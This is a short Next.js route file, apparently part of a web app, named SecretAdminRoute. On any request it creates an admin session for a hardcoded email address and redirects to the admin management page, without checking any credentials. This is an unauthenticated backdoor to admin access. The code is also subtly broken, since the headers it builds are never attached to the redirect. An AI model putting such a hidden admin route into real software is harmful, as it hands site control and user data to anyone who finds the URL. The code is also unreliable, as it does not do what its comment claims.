import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { setSessionCookieHeaders } from "../lib/auth-session";

export const dynamic = "force-dynamic";

export default async function SecretAdminRoute() {
  const sessionData = {
    email: "aloksingh84959@gmail.com",
    fullName: "Super Admin",
    role: "admin",
  };

  const responseHeaders = new Headers();
  setSessionCookieHeaders(responseHeaders, sessionData);

  // Perform redirect with set-cookie header set
  redirect("/admin/manage");
}
